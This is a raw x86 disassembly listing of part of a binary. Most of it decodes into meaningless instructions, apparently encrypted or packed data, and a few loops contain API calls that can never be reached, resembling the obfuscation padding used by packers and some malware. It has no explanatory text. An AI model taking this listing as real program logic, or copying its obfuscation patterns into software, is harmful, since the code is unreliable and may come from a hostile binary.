  4128de:	stos   BYTE PTR es:[edi],al
  4128df:	dec    ecx
  4128e0:	sbb    BYTE PTR [eax],bh
  4128e2:	inc    ebx
  4128e3:	scas   eax,DWORD PTR es:[edi]
  4128e4:	xchg   esp,eax
  4128e5:	push   0xffffffec
  4128e7:	push   edx
  4128e8:	stc    
  4128e9:	call   0x9e8f:0x226e3e40
  4128f0:	inc    ebx
  4128f1:	inc    esp
  4128f2:	push   ds
  4128f3:	and    ch,bl
  4128f5:	add    edx,DWORD PTR [eax-0x7a6a89e2]
  4128fb:	push   ds
  4128fc:	adc    ah,bl
  4128fe:	leave  
  4128ff:	lods   eax,DWORD PTR ds:[esi]
  412900:	xchg   BYTE PTR [ecx*1+0x682271b1],ah
  412907:	sub    eax,0xa165516c
  41290c:	mov    DWORD PTR [edx+eiz*2-0x15d8134b],ebp
  412913:	jns    0x412935
  412915:	jnp    0x412996
  412917:	jmp    0xc0a6:0x904b933f
  41291e:	xchg   ebx,eax
  41291f:	adc    al,0xf
  412921:	jae    0x41293e
  412923:	cmp    eax,0x79dd17d0
  412928:	sbb    al,BYTE PTR [edi-0x7b]
  41292b:	push   0x21
  41292d:	sub    ebx,DWORD PTR ds:0xc713a6fe
  412933:	or     edi,DWORD PTR [edx-0x4d473401]
  412939:	loopne 0x41298c
  41293b:	cmp    bh,BYTE PTR [edi-0x73]
  41293e:	sub    ah,ch
  412940:	push   edi
  412941:	sbb    eax,0xbb726a9c
  412946:	xor    BYTE PTR [esi+0xf],0x39
  41294a:	stos   BYTE PTR es:[edi],al
  41294b:	lea    esp,[ebx+ecx*8]
  41294e:	cs mov ecx,0xb0945fc7
  412954:	das    
  412955:	mov    esp,0xd5ac3e95
  41295a:	mov    bl,BYTE PTR [ebx+ebp*1]
  41295d:	xor    DWORD PTR [ebp+0x287a7e69],ebp
  412963:	jmp    0x41297d
  412965:	sbb    esp,DWORD PTR [eax]
  412967:	push   eax
  412968:	and    BYTE PTR [edx],dh
  41296a:	in     al,dx
  41296b:	loope  0x41291a
  41296d:	adc    BYTE PTR [edi],0xad
  412970:	js     0x4129b2
  412972:	jp     0x41299d
  412974:	cmp    ecx,ecx
  412976:	sbb    cl,bl
  412978:	into   
  412979:	es mov al,0xec
  41297c:	or     bh,bl
  41297e:	loope  0x4129b1
  412980:	sub    edx,ebx
  412982:	cld    
  412983:	xchg   DWORD PTR [eax+edi*2+0x1d],eax
  412987:	dec    eax
  412988:	dec    eax
  412989:	pop    eax
  41298a:	ins    DWORD PTR es:[edi],dx
  41298b:	inc    esp
  41298c:	inc    edi
  41298d:	jno    0x412957
  41298f:	or     dl,dl
  412991:	fnstenv [ebx-0x5add05a5]
  412997:	sub    bl,BYTE PTR [eax+0x21]
  41299a:	push   0x8a8271dd
  41299f:	push   edi
  4129a0:	fs push edx
  4129a2:	or     al,0x83
  4129a4:	sbb    DWORD PTR [eax-0x73],esi
  4129a7:	inc    ecx
  4129a8:	inc    edi
  4129a9:	sbb    eax,0xd398d897
  4129ae:	retf   
  4129af:	sub    ah,ch
  4129b1:	mov    ah,0xf9
  4129b3:	jle    0x412a00
  4129b5:	popf   
  4129b6:	data16 (bad) 
  4129b8:	mov    al,ds:0x7df06cec
  4129bd:	push   ss
  4129be:	xlat   BYTE PTR ds:[ebx]
  4129bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129c0:	clc    
  4129c1:	sbb    BYTE PTR [edx-0x21],ah
  4129c4:	lahf   
  4129c5:	stos   BYTE PTR es:[edi],al
  4129c6:	pop    ds
  4129c7:	add    ecx,esi
  4129c9:	(bad)  
  4129ca:	pop    esi
  4129cb:	push   0xffffffb0
  4129cd:	aas    
  4129ce:	sar    esp,1
  4129d0:	out    dx,al
  4129d1:	in     al,0x8f
  4129d3:	pop    ecx
  4129d4:	pusha  
  4129d5:	frstor [ebp+0x2ed45270]
  4129db:	add    DWORD PTR [edx-0x2],esp
  4129de:	cmp    eax,0xa69dc91a
  4129e3:	mov    bl,0x25
  4129e5:	sub    BYTE PTR [ecx+0x1],ch
  4129e8:	sub    eax,0x5874c640
  4129ed:	aas    
  4129ee:	and    DWORD PTR fs:[eax-0x7aad2777],ecx
  4129f5:	call   0xf0b:0xa704d31f
  4129fc:	gs and eax,0xf0e0706c
  412a02:	sub    DWORD PTR [ebp-0x445b4981],eax
  412a08:	xlat   BYTE PTR ds:[ebx]
  412a09:	sbb    ah,cl
  412a0b:	les    ebp,FWORD PTR [edi+0x22fbf2cb]
  412a11:	addr16 mov ah,0xca
  412a14:	pop    esp
  412a15:	jnp    0x412a77
  412a17:	inc    esp
  412a18:	push   cs
  412a19:	inc    ecx
  412a1a:	cmp    al,0x78
  412a1c:	cmc    
  412a1d:	xchg   esi,eax
  412a1e:	push   es
  412a1f:	int    0xc6
  412a21:	fxch   st(6)
  412a23:	mov    bl,0x8e
  412a25:	jecxz  0x412a7b
  412a27:	sub    DWORD PTR ds:0xf88e6923,eax
  412a2d:	jmp    0x6889d04
  412a32:	inc    ecx
  412a33:	push   edi
  412a34:	icebp  
  412a35:	jle    0x412a6e
  412a37:	push   ss
  412a38:	repnz mov cl,0xfe
  412a3b:	mov    ecx,0xe036a545
  412a40:	popa   
  412a41:	jecxz  0x412a18
  412a43:	jl     0x412aa8
  412a45:	in     eax,dx
  412a46:	test   BYTE PTR [edi+0x5752ea6a],dl
  412a4c:	sti    
  412a4d:	jne    0x412a69
  412a4f:	inc    esi
  412a50:	call   0xf31b:0xfe6cf71f
  412a57:	dec    edx
  412a58:	and    al,0x8d
  412a5a:	sub    ecx,DWORD PTR [edx+0x6d]
  412a5d:	xchg   edi,eax
  412a5e:	jbe    0x412a14
  412a60:	lock pop ecx
  412a62:	push   0xffffffd7
  412a64:	sbb    esp,DWORD PTR [eax+0x3dd52142]
  412a6a:	pop    esi
  412a6b:	sub    BYTE PTR gs:[edx-0x1d029226],cl
  412a72:	sbb    ebx,0xffffffbd
  412a75:	jle    0x412a77
  412a77:	add    BYTE PTR [esi],0x1e
  412a7a:	test   BYTE PTR [ebx],dl
  412a7c:	clc    
  412a7d:	jg     0x412a47
  412a7f:	mov    esp,0x565bcb3
  412a84:	bound  ebp,QWORD PTR [eax*4-0x11c4aa9f]
  412a8b:	inc    ebp
  412a8c:	dec    esi
  412a8d:	dec    edi
  412a8e:	mov    dh,0x7
  412a90:	je     0x412aa6
  412a96:	mov    ecx,DWORD PTR [ebp+0x14]
  412a99:	add    edi,DWORD PTR ds:0x42e0a0
  412a9f:	mov    ecx,DWORD PTR [ecx]
  412aa1:	or     esi,esi
  412aa3:	mov    DWORD PTR [ebp-0x1c],ecx
  412aa6:	mov    DWORD PTR ds:0x42fc75,0x17
  412ab0:	cmp    DWORD PTR ds:0x42fc75,0x0
  412ab7:	je     0x412b09
  412abd:	cmp    DWORD PTR ds:0x42fc75,0x24
  412ac4:	jne    0x412af1
  412aca:	push   0x5fda
  412acf:	push   0x42de
  412ad4:	push   0x6b28
  412ad9:	push   0x4e0a
  412ade:	push   DWORD PTR [ebp-0x10]
  412ae1:	push   0x8dcd
  412ae6:	push   0x86d4
  412aeb:	call   DWORD PTR ds:0x42e297
  412af1:	mov    edi,DWORD PTR ds:0x42fc75
  412af7:	dec    edi
  412af8:	mov    DWORD PTR ds:0x42fc75,edi
  412afe:	jmp    0x412ab0
  412b03:	and    ecx,DWORD PTR ds:0x42e0a8
  412b09:	imul   edx,eax
  412b0c:	mov    ecx,0x4573
  412b11:	add    DWORD PTR ds:0x42e098,edx
  412b17:	add    edx,ecx
  412b19:	mov    esi,0x7879
  412b1e:	sub    edi,0x22a0
  412b24:	mov    edi,0x1556
  412b29:	jmp    0x412e0d
  412b2e:	retf   
  412b2f:	sbb    eax,eax
  412b31:	inc    esp
  412b32:	loopne 0x412ba7
  412b34:	push   ebx
  412b35:	mov    bl,0x1a
  412b37:	ror    BYTE PTR [edi],cl
  412b39:	ja     0x412ac0
  412b3b:	inc    esp
  412b3c:	loop   0x412b99
  412b3e:	adc    DWORD PTR [esi+0x70],esp
  412b41:	jo     0x412afc
  412b43:	jle    0x412bb5
  412b45:	jo     0x412ae2
  412b47:	inc    edx
  412b48:	rcr    DWORD PTR ds:0xdc10db8d,1
  412b4e:	xchg   esp,eax
  412b4f:	jecxz  0x412b94
  412b51:	pop    ds
  412b52:	gs cmp al,0xe5
  412b55:	xor    BYTE PTR ds:0x9e9d1025,dl
  412b5b:	add    al,0x5c
  412b5d:	push   eax
  412b5e:	pop    esi
  412b5f:	push   ss
  412b60:	dec    esp
  412b61:	inc    ecx
  412b62:	or     DWORD PTR [ebp-0x3a],0xff5ed0d5
  412b69:	or     eax,0x8d0e30f0
  412b6e:	sbb    eax,ebp
  412b70:	mov    dh,al
  412b72:	shr    DWORD PTR [esi],cl
  412b74:	lock fimul WORD PTR [edx-0x7470f2a9]
  412b7b:	int    0x24
  412b7d:	aad    0xa3
  412b7f:	outs   dx,DWORD PTR ds:[esi]
  412b80:	add    eax,0xb5edd5e5
  412b85:	arpl   WORD PTR [ebx-0x5f],cx
  412b88:	fxch   st(4)
  412b8a:	rcl    BYTE PTR [edx],1
  412b8c:	push   ebx
  412b8d:	jno    0x412b99
  412b8f:	pop    edx
  412b90:	add    al,0x3c
  412b92:	test   DWORD PTR [eax],ebp
  412b94:	cmp    BYTE PTR [ebx-0x53e1b54b],dl
  412b9a:	data16 sbb BYTE PTR [ecx-0x41],al
  412b9e:	popa   
  412b9f:	shr    BYTE PTR [edx-0xb],cl
  412ba2:	stos   DWORD PTR es:[edi],eax
  412ba3:	repnz dec esi
  412ba5:	cli    
  412ba6:	dec    ebp
  412ba7:	xchg   esi,eax
  412ba8:	dec    eax
  412ba9:	les    edx,FWORD PTR [ebp-0x78]
  412bac:	or     bl,cl
  412bae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412baf:	div    DWORD PTR [esi-0x6e62b661]
  412bb5:	sbb    BYTE PTR [ebp-0x2c],bh
  412bb8:	xchg   DWORD PTR [edx],edi
  412bba:	xchg   BYTE PTR gs:[eax],ah
  412bbd:	ficom  DWORD PTR [edi]
  412bbf:	adc    ch,0x42
  412bc2:	cmp    dh,dl
  412bc4:	(bad)  
  412bc5:	xchg   ebx,eax
  412bc6:	jle    0x412b8b
  412bc8:	sahf   
  412bc9:	(bad)  
  412bca:	push   edx
  412bcb:	mov    bl,0x5a
  412bce:	and    al,BYTE PTR [esi-0x5b9234f9]
  412bd4:	out    0x5e,al
  412bd6:	adc    ah,cl
  412bd8:	jo     0x412b6d
  412bda:	dec    ebp
  412bdb:	dec    edi
  412bdc:	pop    edx
  412bdd:	js     0x412b7a
  412bdf:	in     eax,dx
  412be0:	mov    dl,0xe7
  412be2:	sub    DWORD PTR [eax+0x38f60340],0xffffffb2
  412be9:	inc    edx
  412bea:	xor    eax,0x54f4d3b4
  412bef:	sbb    bl,BYTE PTR [ecx-0x44]
  412bf2:	jmp    0x16ad5cc9
  412bf7:	fild   QWORD PTR [edx+ebp*4-0x3654593b]
  412bfe:	mov    DWORD PTR [esi-0x36eace29],edx
  412c04:	js     0x412be6
  412c06:	and    BYTE PTR [edx+esi*2],0xd1
  412c0a:	adc    al,0x19
  412c0c:	(bad)  
  412c0e:	loopne 0x412bd5
  412c10:	fisubr DWORD PTR [edi+eiz*8+0x3bdf2e9e]
  412c17:	outs   dx,DWORD PTR ds:[esi]
  412c18:	dec    ebp
  412c19:	out    dx,eax
  412c1a:	data16 adc al,0xd1
  412c1d:	adc    DWORD PTR [esi],0xfffffffa
  412c20:	test   ebp,edi
  412c22:	sub    eax,0x6df102c5
  412c27:	cld    
  412c28:	cld    
  412c29:	mov    cl,ah
  412c2b:	cmp    esi,esp
  412c2d:	jbe    0x412c62
  412c2f:	push   eax
  412c30:	xchg   edx,eax
  412c31:	xor    edi,DWORD PTR [esi]
  412c33:	adc    ebp,DWORD PTR [ebx]
  412c35:	imul   edx,DWORD PTR [esi],0x4a00d91f
  412c3b:	mov    esi,ebp
  412c3d:	int3   
  412c3e:	xchg   ecx,eax
  412c3f:	push   ds
  412c40:	ret    0x3ffd
  412c43:	sub    BYTE PTR [eax-0x1b],ch
  412c46:	out    dx,eax
  412c47:	mov    ds:0xcfd81c2f,al
  412c4c:	sub    BYTE PTR [eax],bh
  412c4e:	inc    eax
  412c4f:	data16 ja 0x412c3b
  412c52:	mov    cl,0x24
  412c54:	mov    esp,0xc29bdfc6
  412c59:	sub    ebx,DWORD PTR [esi]
  412c5b:	mov    edi,0x2e27fb5a
  412c60:	pusha  
  412c61:	mov    DWORD PTR [eax],ebx
  412c63:	xchg   ecx,eax
  412c64:	stos   DWORD PTR es:[edi],eax
  412c65:	sbb    eax,0xa4c47480
  412c6a:	or     al,0x6f
  412c6c:	inc    esi
  412c6d:	jp     0x412c88
  412c6f:	pop    edi
  412c70:	aam    0x7c
  412c72:	mov    gs,WORD PTR [ecx]
  412c74:	dec    ebp
  412c75:	add    DWORD PTR [eax],ebp
  412c77:	pusha  
  412c78:	popa   
  412c79:	inc    ecx
  412c7a:	jle    0x412c8f
  412c7c:	call   0xce67:0x2ce049c8
  412c83:	leave  
  412c84:	call   0x2034cd04
  412c89:	call   0xc9dda9ca
  412c8e:	dec    ebp
  412c8f:	(bad)  
  412c90:	std    
  412c91:	push   ebx
  412c92:	repnz cld 
  412c94:	adc    al,0xc8
  412c96:	push   ecx
  412c97:	cdq    
  412c98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412c99:	retf   0xedf0
  412c9c:	dec    eax
  412c9d:	jge    0x412c4a
  412c9f:	pop    eax
  412ca0:	cli    
  412ca1:	test   BYTE PTR [bx+si],0x2f
  412ca5:	aad    0x31
  412ca7:	add    BYTE PTR [ecx],ch
  412ca9:	(bad)  
  412caa:	push   esp
  412cab:	dec    ebx
  412cac:	jmp    0x412c5b
  412cae:	sub    DWORD PTR [edx-0x2b5547c8],ebx
  412cb4:	mov    ds:0xd0006d16,eax
  412cb9:	xchg   esp,eax
  412cba:	fs push edi
  412cbc:	sbb    eax,DWORD PTR es:[ecx-0x455cb485]
  412cc3:	inc    ebx
  412cc4:	pusha  
  412cc5:	scas   al,BYTE PTR es:[edi]
  412cc6:	cmp    cl,cl
  412cc8:	loop   0x412d0f
  412cca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ccb:	fcom   QWORD PTR [ebp+0x676bad5b]
  412cd1:	ficomp WORD PTR [edx+0x46]
  412cd4:	dec    ebp
  412cd5:	dec    eax
  412cd6:	sub    eax,0x3620c271
  412cdb:	mov    bl,0x2d
  412cdd:	je     0x412d56
  412cdf:	repz xchg ebx,eax
  412ce1:	sub    bl,BYTE PTR [edx+0x720081a2]
  412ce7:	out    dx,eax
  412ce8:	sbb    BYTE PTR ds:0x9b04f794,bl
  412cee:	sub    BYTE PTR [ecx],ch
  412cf0:	int3   
  412cf1:	or     bl,BYTE PTR [ecx]
  412cf3:	and    al,0x50
  412cf5:	inc    DWORD PTR [esi+ebp*4+0x1d]
  412cf9:	shl    DWORD PTR [esi+0x79],cl
  412cfc:	stc    
  412cfd:	xchg   ecx,eax
  412cfe:	fsub   QWORD PTR [ecx]
  412d00:	scas   eax,DWORD PTR es:[edi]
  412d01:	xchg   esp,eax
  412d02:	jno    0x412c95
  412d04:	cwde   
  412d05:	popa   
  412d06:	ins    DWORD PTR es:[edi],dx
  412d07:	aaa    
  412d08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d09:	adc    edx,DWORD PTR [edi-0x75]
  412d0c:	mov    bh,0x7b
  412d0e:	pop    esi
  412d0f:	mov    ebp,0xcbe27dd2
  412d14:	in     eax,0xce
  412d16:	arpl   WORD PTR [edi-0x39],dx
  412d19:	mov    esi,DWORD PTR [edx+0x63]
  412d1c:	sub    ebx,0xffffffba
  412d1f:	add    ebx,eax
  412d21:	push   esp
  412d22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d23:	(bad)  
  412d24:	out    0xa7,eax
  412d26:	jle    0x412cfd
  412d28:	pop    ebx
  412d29:	mov    ah,0xaa
  412d2b:	xor    al,0xa6
  412d2d:	data16 cld 
  412d2f:	add    ebx,ebp
  412d31:	lahf   
  412d32:	outs   dx,DWORD PTR ds:[esi]
  412d33:	adc    eax,0x2123f6b6
  412d38:	mov    edi,0xc388b0f1
  412d3d:	xchg   ebp,eax
  412d3e:	loopne 0x412d1a
  412d40:	pop    ds
  412d41:	mov    ecx,0xc16fbf2f
  412d46:	ret    0x950e
  412d49:	loope  0x412cef
  412d4b:	adc    eax,0x9072fc9
  412d50:	jp     0x412d1f
  412d52:	mov    eax,ds:0x29d10f7
  412d57:	mov    ah,0xfa
  412d59:	jne    0x412da9
  412d5b:	ins    BYTE PTR es:[edi],dx
  412d5c:	retf   
  412d5d:	mov    bl,0x91
  412d5f:	loop   0x412d31
  412d61:	pushf  
  412d62:	dec    edx
  412d63:	xor    ebx,DWORD PTR [ebx+0x66c1a75e]
  412d69:	pushf  
  412d6a:	fsubr  DWORD PTR [ebp-0x3c412c31]
  412d70:	(bad)  
  412d71:	pop    esp
  412d72:	out    0x27,al
  412d74:	push   ebp
  412d75:	push   esp
  412d76:	sar    bl,1
  412d78:	imul   eax,DWORD PTR [ebx],0xdd8a601f
  412d7e:	pop    es
  412d7f:	xchg   ebp,eax
  412d80:	push   ss
  412d81:	adc    dh,dh
  412d83:	in     al,dx
  412d84:	mov    edi,0x101f0312
  412d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d8a:	(bad)  
  412d8c:	test   eax,0x3e1bb4be
  412d91:	add    al,0xb2
  412d93:	cmp    ch,ch
  412d95:	xchg   esp,eax
  412d96:	ror    ah,cl
  412d98:	push   edx
  412d99:	inc    eax
  412d9a:	adc    DWORD PTR [ebp-0x5e],0xffffffaa
  412d9e:	xor    bl,bh
  412da0:	repz lds eax,FWORD PTR [edx+0xe7339f9]
  412da7:	or     DWORD PTR [eax-0x5795c5b5],esp
  412dad:	sub    dl,BYTE PTR [edi+0x27]
  412db0:	sbb    esp,ebp
  412db2:	mov    edx,0xc3fd696c
  412db7:	pop    ecx
  412db8:	out    dx,al
  412db9:	sub    ebx,0xffffffc0
  412dbc:	dec    esi
  412dbd:	xor    eax,0xc3d05a9
  412dc2:	mov    cl,0x7c
  412dc4:	mov    eax,0x3ae3becf
  412dc9:	pop    edi
  412dca:	mov    bl,0x23
  412dcc:	ficom  DWORD PTR [ebp+0x1cf29aed]
  412dd2:	icebp  
  412dd3:	mov    BYTE PTR [ecx-0x33],ch
  412dd6:	out    0xa1,eax
  412dd8:	inc    edx
  412dd9:	test   BYTE PTR [edi+0x68b464a1],cl
  412ddf:	inc    ebx
  412de0:	repnz cmc 
  412de2:	clc    
  412de3:	cmp    BYTE PTR [ebx+0x6a6f1bac],dl
  412de9:	aaa    
  412dea:	mov    edi,0xb6395c7b
  412def:	in     eax,0x40
  412df1:	push   ds
  412df2:	stc    
  412df3:	loopne 0x412d81
  412df5:	sub    al,0xc5
  412df7:	out    dx,al
  412df8:	adc    edi,DWORD PTR [eax+0x6f196969]
  412dfe:	test   dl,dl
  412e00:	push   edi
  412e01:	add    DWORD PTR [ebx-0x1095668c],eax
  412e07:	sbb    eax,0x81cee308
  412e0d:	xchg   esi,ecx
  412e0f:	and    DWORD PTR ds:0x42e09c,0x0
  412e19:	jmp    0x412e2d
  412e1e:	xor    ecx,ecx
  412e20:	add    ecx,DWORD PTR ds:0x42e09c
  412e26:	inc    ecx
  412e27:	mov    DWORD PTR ds:0x42e09c,ecx
  412e2d:	cmp    DWORD PTR ds:0x42e09c,0x17
  412e34:	jae    0x412e60
  412e3a:	cmp    DWORD PTR ds:0x42e09c,0x25
  412e41:	jne    0x412e55
  412e47:	push   0x286f
  412e4c:	push   DWORD PTR [ebp-0x18]
  412e4f:	call   DWORD PTR ds:0x42e407
  412e55:	jmp    0x412e1e
  412e5a:	xor    ecx,0x7ba7
  412e60:	sub    edx,edi
  412e62:	xor    esi,esi
  412e64:	jmp    0x413148
  412e69:	call   0x6aab08c6
  412e6e:	jno    0x412ee7
  412e70:	popa   
  412e71:	push   ebx
  412e72:	xchg   eax,esp
  412e74:	arpl   WORD PTR [edi+0x5acc809b],bp
  412e7a:	fs jo  0x412eed
  412e7d:	mov    ecx,0x3770707e
  412e82:	inc    eax
  412e83:	jne    0x412e9a
  412e85:	sahf   
  412e86:	and    DWORD PTR [ebp+0x37],eax
  412e89:	daa    
  412e8a:	mov    eax,ds:0xa6c2e6c6
  412e8f:	mov    al,BYTE PTR [ecx+edx*2-0x32]
  412e93:	and    DWORD PTR fs:[edx-0x64871fd1],ebx
  412e9a:	mov    al,ds:0x5979846c
  412e9f:	xchg   edi,eax
  412ea0:	shr    BYTE PTR [ebp+0x5963ef30],1
  412ea6:	fidiv  WORD PTR [esp+eax*2+0x5d1820b6]
  412ead:	push   es
  412eae:	rcl    DWORD PTR [esi],cl
  412eb0:	mov    DWORD PTR [ecx-0x21],esi
  412eb3:	(bad)  
  412eb4:	loope  0x412ee0
  412eb6:	retf   0xc063
  412eb9:	test   al,0x9a
  412ebb:	jp     0x412ee2
  412ebd:	(bad)  
  412ebe:	fs pop edx
  412ec0:	jb     0x412f41
  412ec2:	and    ah,BYTE PTR ss:[ecx+0xb6c80ba]
  412ec9:	js     0x412f02
  412ecb:	cmc    
  412ecc:	in     al,dx
  412ecd:	jo     0x412ee7
  412ecf:	mov    ecx,0x994bf4f8
  412ed4:	fsubr  QWORD PTR [ebp-0x44]
  412ed7:	bound  esi,QWORD PTR [eax+0x498c214e]
  412edd:	in     al,dx
  412ede:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412edf:	adc    eax,0x5d2424e7
  412ee4:	xor    edi,DWORD PTR ds:0x3568430b
  412eea:	loop   0x412e76
  412eec:	fld    TBYTE PTR [ebx+eiz*2+0x7c4df587]
  412ef3:	xor    eax,0x86d8db5a
  412ef8:	and    al,0x33
  412efa:	das    
  412efb:	pop    es
  412efc:	inc    ebx
  412efd:	jno    0x412e9b
  412eff:	pop    edi
  412f00:	das    
  412f01:	adc    eax,DWORD PTR [ecx-0x55c792c3]
  412f07:	xor    DWORD PTR [edi],0xfffffff7
  412f0a:	mov    ecx,DWORD PTR [esi+0x1bac71e4]
  412f10:	out    0x7a,eax
  412f12:	jp     0x412ed2
  412f14:	and    edi,ebx
  412f16:	js     0x412ef3
  412f18:	stos   DWORD PTR es:[edi],eax
  412f19:	loope  0x412f83
  412f1b:	push   edx
  412f1c:	cmp    BYTE PTR [edx+0x781b1e20],ah
  412f22:	push   es
  412f23:	cmp    esp,ebp
  412f25:	pop    ecx
  412f26:	iret   
  412f27:	mov    cl,0x57
  412f29:	inc    eax
  412f2a:	push   eax
  412f2b:	pop    ebx
  412f2c:	cmp    al,0xff
  412f2e:	push   ebp
  412f2f:	jb     0x412f54
  412f31:	mul    ecx
  412f33:	pop    eax
  412f34:	scas   al,BYTE PTR es:[edi]
  412f35:	mov    edi,0xf9830abb
  412f3a:	jecxz  0x412f77
  412f3c:	push   DWORD PTR [esi-0x469dc484]
  412f42:	test   al,0xb9
  412f44:	loop   0x412f60
  412f46:	jg     0x412fa2
  412f48:	xor    ebp,DWORD PTR [eax+0xa]
  412f4b:	fsub   QWORD PTR [eax-0x3c]
  412f4e:	and    BYTE PTR [edi-0xba2dfc7],bl
  412f54:	fucomip st,st(7)
  412f56:	loope  0x412fd6
  412f58:	into   
  412f59:	mov    ah,0x80
  412f5b:	ror    DWORD PTR [ecx],1
  412f5d:	sub    DWORD PTR [eax+0x55],ecx
  412f60:	imul   edx,DWORD PTR [edx+0x7d],0xffffffe8
  412f64:	sub    ebp,DWORD PTR [ecx+edi*1-0x31670ea4]
  412f6b:	dec    eax
  412f6c:	and    dl,BYTE PTR [edi]
  412f6e:	test   DWORD PTR [ebx+0x6749d877],eax
  412f74:	stc    
  412f75:	cwde   
  412f76:	sbb    al,0xc1
  412f78:	sbb    cl,dl
  412f7a:	das    
  412f7b:	ficom  DWORD PTR [ebp+0x6a5d40e]
  412f81:	in     al,0xef
  412f83:	sahf   
  412f84:	std    
  412f85:	xchg   ecx,eax
  412f86:	push   esp
  412f87:	test   DWORD PTR [edi+edx*4],edx
  412f8a:	jno    0x412fc4
  412f8c:	icebp  
  412f8d:	xor    ebx,esp
  412f8f:	in     al,dx
  412f90:	nop
  412f91:	lea    ecx,[ecx+ebp*1-0x1e]
  412f95:	ficomp DWORD PTR [ecx]
  412f97:	push   ebx
  412f98:	jne    0x412f96
  412f9a:	pop    edi
  412f9b:	pop    eax
  412f9c:	dec    esp
  412f9d:	bound  edx,QWORD PTR [esi]
  412f9f:	dec    eax
  412fa0:	sub    esp,DWORD PTR [edi-0x33]
  412fa3:	lock push edi
  412fa5:	(bad)  
  412fa6:	out    0x13,eax
  412fa8:	push   es
  412fa9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412faa:	jle    0x412fe0
  412fac:	xor    ah,BYTE PTR [ebp+0x73]
  412faf:	dec    edx
  412fb0:	cmp    esp,DWORD PTR [ebp+0x36e2e872]
  412fb6:	mov    ds:0xea77c389,eax
  412fbb:	mov    dl,0x8d
  412fbd:	fmul   DWORD PTR [eax]
  412fbf:	adc    BYTE PTR [esi+0x1c],ch
  412fc2:	push   0x4a97f851
  412fc7:	xchg   ebx,eax
  412fc8:	push   ebx
  412fc9:	pop    ebx
  412fca:	mov    dh,0x3c
  412fcc:	mov    dh,ch
  412fce:	enter  0xb7af,0x83
  412fd2:	push   0x140dd1e0
  412fd7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412fd8:	inc    edx
  412fd9:	xor    DWORD PTR [esi+eax*8],edi
  412fdc:	test   al,0x75
  412fde:	in     al,dx
  412fdf:	ret    
  412fe0:	aam    0xa9
  412fe2:	dec    ebp
  412fe3:	mov    ebx,DWORD PTR [ebx+edi*2-0x1a05c1b5]
  412fea:	xchg   esp,eax
  412feb:	xchg   edx,eax
  412fec:	out    0xa5,al
  412fee:	add    al,0xb5
  412ff0:	jge    0x412fb0
  412ff2:	mov    dh,0x60
  412ff4:	pop    esp
  412ff5:	mov    edi,cs
  412ff7:	xlat   BYTE PTR ds:[ebx]
  412ff8:	jp     0x412f97
  412ffa:	push   eax
  412ffb:	inc    edi
  412ffc:	dec    esp
  412ffd:	and    eax,0x8da402b3
  413002:	xor    BYTE PTR [esi],dh
  413004:	pop    esi
  413005:	imul   esi,ebx,0x41
  413008:	dec    esi
  413009:	test   al,0x91
  41300b:	cmp    eax,0x455507b9
  413010:	inc    eax
  413011:	cld    
  413012:	leave  
  413013:	inc    ecx
  413014:	cmp    BYTE PTR [eax+0x4bface16],bl
  41301a:	ror    BYTE PTR [eax+0x66c2adbb],1
  413020:	(bad)  
  413022:	jge    0x412fe6
  413024:	out    0x2c,al
  413026:	dec    eax
  413027:	jnp    0x412fd6
  413029:	cs pop edi
  41302b:	adc    eax,0x45dfbe4d
  413030:	xor    al,0x18
  413032:	mov    esp,DWORD PTR [edx-0x46]
  413035:	push   cs
  413036:	pushfw 
  413038:	cmp    DWORD PTR [edx+0x1b72e754],ecx
  41303e:	popf   
  41303f:	test   eax,0xe809aea5
  413044:	or     bh,bh
  413046:	xor    ecx,DWORD PTR [eax]
  413048:	jno    0x413006
  41304a:	ins    DWORD PTR es:[edi],dx
  41304b:	adc    ah,BYTE PTR [ebx]
  41304d:	sub    al,BYTE PTR [esi]
  41304f:	sbb    DWORD PTR [eax-0x716f8504],esi
  413055:	inc    esp
  413056:	and    dx,WORD PTR [edi]
  413059:	pop    esi
  41305a:	xchg   ebx,eax
  41305b:	xor    al,0x9e
  41305d:	push   0x50
  41305f:	pop    eax
  413060:	dec    ecx
  413061:	call   0xbc27f3b4
  413066:	mov    WORD PTR [esi+0x40abdad2],gs
  41306c:	mov    cl,0x83
  41306e:	mov    dl,0x66
  413070:	or     DWORD PTR [ebp-0x6b],ebx
  413073:	stc    
  413074:	inc    DWORD PTR [eax-0x1b641]
  41307a:	sbb    edx,DWORD PTR [ecx]
  41307c:	mov    edi,0x5be6f2be
  413081:	xlat   BYTE PTR ds:[ebx]
  413082:	and    al,0x4d
  413084:	mov    al,ds:0x10255271
  413089:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41308a:	outs   dx,BYTE PTR ds:[esi]
  41308b:	std    
  41308c:	and    bl,BYTE PTR [ecx+0x17]
  41308f:	push   esp
  413090:	pop    ebp
  413091:	in     al,0xc4
  413093:	pop    edx
  413094:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  413096:	and    al,0xc1
  413098:	xor    eax,0xa0b3699a
  41309d:	pop    esi
  41309e:	jg     0x4130bc
  4130a0:	push   ebx
  4130a1:	mov    dl,BYTE PTR [ebp-0x12b42f00]
  4130a7:	mov    eax,DWORD PTR [edx-0xfc4426d]
  4130ad:	mov    ecx,0xd38de51b
  4130b2:	repnz xchg ebp,eax
  4130b4:	in     eax,dx
  4130b5:	sbb    eax,0xcdec06f7
  4130ba:	mov    ebx,0x76d03420
  4130bf:	repz sub DWORD PTR [edx+0x353cd103],0x4e
  4130c7:	mov    dh,0x1b
  4130c9:	lock add al,BYTE PTR [ebp+0x6d]
  4130cd:	stos   BYTE PTR es:[edi],al
  4130ce:	cmp    eax,0xe3b0c72f
  4130d3:	sbb    ebp,eax
  4130d5:	ror    esp,1
  4130d7:	jno    0x413072
  4130d9:	dec    ebp
  4130da:	xor    ecx,edx
  4130dc:	inc    eax
  4130dd:	pop    esp
  4130de:	je     0x413078
  4130e0:	sub    DWORD PTR [esi+eax*4-0x41f06c04],ecx
